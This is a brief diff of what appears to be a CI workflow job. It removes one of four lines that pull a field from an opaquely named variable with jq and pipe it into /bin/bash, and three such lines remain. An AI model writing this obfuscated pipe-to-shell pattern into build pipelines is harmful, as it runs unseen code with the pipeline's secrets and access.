@@ -25,7 +25,6 @@ jobs:
           echo $zg85551 | jq -r .eyf0328 | /bin/bash
           echo $aag931 | jq -r .sxe04590 | /bin/bash
           echo $oafts65 | jq -r .wgtrp19 | /bin/bash
-          printf '%s' "$ey925" | jq -r .nepzj60352 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
